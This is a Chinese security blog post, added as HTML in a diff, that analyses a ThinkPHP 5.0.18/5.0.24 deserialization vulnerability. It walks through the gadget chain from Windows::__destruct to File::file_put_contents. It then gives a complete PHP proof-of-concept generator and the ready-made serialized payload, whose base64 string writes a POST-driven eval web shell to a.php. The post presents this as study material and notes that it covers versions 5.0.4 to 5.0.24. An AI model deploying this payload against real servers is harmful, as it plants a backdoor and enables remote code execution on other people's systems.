@@ -1,0 +1,328 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ThinkPHP5.0.18/24反序列化漏洞 - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="seay源码审计，这里是利用点/thinkphp/library/think/cache/driver/File.php
+$result = file_put_contents($filename,,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="/atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">ThinkPHP5.0.18/24反序列化漏洞</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">ThinkPHP5.0.18/24反序列化漏洞</h1>
+        <div class="stuff">
+            <span>十一月 08, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>seay源码审计，这里是利用点/thinkphp/library/think/cache/driver/File.php</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/image-20211108141600243.png" alt="image-20211108141600243"></p>
+<p>从反序列化起点开始分析：</p>
+<h5 id="thinkphp-library-think-process-pipes-Windows-php"><a href="#thinkphp-library-think-process-pipes-Windows-php" class="headerlink" title="thinkphp/library/think/process/pipes/Windows.php"></a>thinkphp/library/think/process/pipes/Windows.php</h5><p>__destruct方法</p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/image-20211108142854098.png" alt="image-20211108142854098"></p>
+<p>调用removeFiles，跟进</p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/image-20211108143027678.png" alt="image-20211108143027678"></p>
+<p>vscode中左上二可进行全局搜索</p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/image-20211108143117628.png" alt="image-20211108143117628"></p>
+<h5 id="跳板利用点：thinkphp-library-think-Model-php"><a href="#跳板利用点：thinkphp-library-think-Model-php" class="headerlink" title="跳板利用点：thinkphp/library/think/Model.php"></a>跳板利用点：thinkphp/library/think/Model.php</h5><p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/image-20211108143236007.png" alt="image-20211108143236007"></p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/image-20211108143300312.png" alt="image-20211108143300312"></p>
+<p>存在三个地方可以调用__call,调试后选择第三处作为跳板</p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/image-20211108143610613.png" alt="image-20211108143610613"></p>
+<pre class=" language-PHP"><code class="language-PHP">$item[$key] = $value ? $value->getAttr($attr) : null;</code></pre>
+<pre class=" language-PHP"><code class="language-PHP">$modelRelation = $this->$relation();
+$value         = $this->getRelationData($modelRelation);</code></pre>
+<p>getRelationData</p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/image-20211108145213733.png" alt="image-20211108145213733"></p>
+<p>跟进OneToOne类getBindAttr方法</p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/image-20211108150005998.png" alt="image-20211108150005998"></p>
+<p>至此代码执行到<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code>就能够执行Output类__call魔术方法</p>
+<h5 id="thinkphp-library-think-console-Output-php"><a href="#thinkphp-library-think-console-Output-php" class="headerlink" title="thinkphp/library/think/console/Output.php"></a>thinkphp/library/think/console/Output.php</h5><p>Output类中__call方法，调用block方法做跳板</p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/image-20211108142437435.png" alt="image-20211108142437435"></p>
+<p>output类block方法</p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/image-20211108150404705.png" alt="image-20211108150404705"></p>
+<p>跟进writein</p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/image-20211108150458498.png" alt="image-20211108150458498"></p>
+<p>跟进Memcached类write方法</p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/image-20211108150621662.png" alt="image-20211108150621662"></p>
+<p>继续跟进set</p>
+<h5 id="thinkphp-library-think-cache-driver-File-php"><a href="#thinkphp-library-think-cache-driver-File-php" class="headerlink" title="thinkphp/library/think/cache/driver/File.php"></a>thinkphp/library/think/cache/driver/File.php</h5><p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/image-20211108150824402.png" alt="image-20211108150824402"></p>
+<p>发现file_put_contents函数</p>
+<p>$filename<code>可控且可以利用伪协议绕过</code>exit</p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/image-20211108150954684.png" alt="image-20211108150954684"></p>
+<p><code>$data</code>值比较棘手,这里有个坑，由于最后调用<code>set</code>方法中的参数来自先前调用的<code>write</code>方法</p>
+<p>只能为<code>true</code>，且这里<code>$expire</code>只能为数值，这样文件内容就无法写<strong>shell</strong></p>
+<p>用文章里的一张图</p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/image-20211108151220943.png" alt="image-20211108151220943"></p>
+<p>跟进setTagItem，会再执行一次<code>set</code>方法，且这里文件内容<code>$value</code>通过<code>$name</code>赋值(文件名)</p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/image-20211108151334856.png" alt="image-20211108151334856"></p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$value</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=string.rot13/resource=./&lt;?cuc cucvasb();?></span></code></pre>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$value</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php</span></code></pre>
+<h1 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h1><p>使用文章里的一张图</p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/1.png" alt="1"></p>
+<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token comment" spellcheck="true">//__destruct</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">{</span>
+    <span class="token keyword">class</span> <span class="token class-name">Windows</span><span class="token punctuation">{</span>
+        <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$pivot</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$pivot</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//传入Pivot类</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment" spellcheck="true">//__toString Model子类</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">{</span>
+    <span class="token keyword">class</span> <span class="token class-name">Pivot</span><span class="token punctuation">{</span>
+        <span class="token keyword">protected</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">,</span><span class="token variable">$hasone</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span><span class="token operator">=</span><span class="token variable">$output</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$this->parent等于Output类</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'getError'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token operator">=</span><span class="token variable">$hasone</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//$modelRelation=$this->error</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment" spellcheck="true">//getModel</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">{</span>
+    <span class="token keyword">class</span> <span class="token class-name">Query</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span><span class="token operator">=</span><span class="token variable">$output</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//get_class($modelRelation->getModel()) == get_class($this->parent)</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">{</span>
+    <span class="token keyword">class</span> <span class="token class-name">Output</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">private</span> <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$styles</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$memcached</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span><span class="token operator">=</span><span class="token variable">$memcached</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">styles</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment" spellcheck="true">//Relation</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">{</span>
+    <span class="token keyword">class</span> <span class="token class-name">HasOne</span><span class="token punctuation">{</span>
+        <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span><span class="token operator">=</span><span class="token variable">$query</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//调用Query类的getModel</span>
+
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">selfRelation</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//满足条件!$modelRelation->isSelfRelation()</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//控制__call的参数$attr</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">{</span>
+    <span class="token keyword">class</span> <span class="token class-name">Memcached</span><span class="token punctuation">{</span>
+        <span class="token keyword">protected</span> <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$this->handler等于File类</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">{</span>
+    <span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>
+        <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
+            <span class="token string">'path'</span><span class="token operator">=</span><span class="token operator">></span> 'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php',</span>
+            <span class="token string">'cache_subdir'</span><span class="token operator">=</span><span class="token operator">></span><span class="token boolean">false</span><span class="token punctuation">,</span>
+            <span class="token string">'prefix'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">''</span><span class="token punctuation">,</span>
+            <span class="token string">'data_compress'</span><span class="token operator">=</span><span class="token operator">></span><span class="token boolean">false</span>
+        <span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>
+
+
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">namespace</span> <span class="token punctuation">{</span>
+    <span class="token variable">$file</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$memcached</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcached</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$output</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">(</span><span class="token variable">$memcached</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$query</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$hasone</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>HasOne</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$pivot</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">,</span><span class="token variable">$hasone</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$windows</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">(</span><span class="token variable">$pivot</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$windows</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<pre><code>O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00parent%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A4%3A%7Bs%3A4%3A%22path%22%3Bs%3A122%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fa.php%22%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7Ds%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3Br%3A4%3B%7Ds%3A15%3A%22%00%2A%00selfRelation%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A5%3A%22admin%22%3B%7D%7D%7D%7D%</code></pre>
+<p>URLDecode</p>
+<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">:</span><span class="token string">"think\process\pipes\Windows"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">34</span><span class="token punctuation">:</span><span class="token string">"�think\process\pipes\Windows�files"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">:</span><span class="token string">"think\model\Pivot"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"�*�parent"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"think\console\Output"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token string">"�think\console\Output�handle"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">:</span><span class="token string">"think\session\driver\Memcached"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"�*�handler"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">23</span><span class="token punctuation">:</span><span class="token string">"think\cache\driver\File"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"�*�options"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"path"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">122</span><span class="token punctuation">:</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php";s:12:"cache_subdir";b:0;s:6:"prefix";s:0:"";s:13:"data_compress";b:0;}s:6:"�*�tag";b:1;}}s:9:"�*�styles";a:1:{i:0;s:7:"getAttr";}}s:9:"�*�append";a:1:{s:1:"a";s:8:"getError";}s:8:"�*�error";O:27:"think\model\relation\HasOne":3:{s:8:"�*�query";O:14:"think\db\Query":1:{s:8:"�*�model";r:4;}s:15:"�*�selfRelation";b:0;s:11:"�*�bindAttr";a:1:{s:1:"a";s:5:"admin";}}}}%</span></code></pre>
+<p>由于在后续版本中Relation重构，且成为了抽象类，所以此方法无法向上兼容，仅作学习参考</p>
+<p>改变其中的某些节点，可覆盖5.0.4-5.0.24版本，</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#thinkphp-library-think-process-pipes-Windows-php"><span class="toc-number">1.</span> <span class="toc-text">thinkphp&#x2F;library&#x2F;think&#x2F;process&#x2F;pipes&#x2F;Windows.php</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B7%B3%E6%9D%BF%E5%88%A9%E7%94%A8%E7%82%B9%EF%BC%9Athinkphp-library-think-Model-php"><span class="toc-number">2.</span> <span class="toc-text">跳板利用点：thinkphp&#x2F;library&#x2F;think&#x2F;Model.php</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#thinkphp-library-think-console-Output-php"><span class="toc-number">3.</span> <span class="toc-text">thinkphp&#x2F;library&#x2F;think&#x2F;console&#x2F;Output.php</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#thinkphp-library-think-cache-driver-File-php"><span class="toc-number">4.</span> <span class="toc-text">thinkphp&#x2F;library&#x2F;think&#x2F;cache&#x2F;driver&#x2F;File.php</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POP%E9%93%BE"><span class="toc-number"></span> <span class="toc-text">POP链</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POC"><span class="toc-number"></span> <span class="toc-text">POC</span></a>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
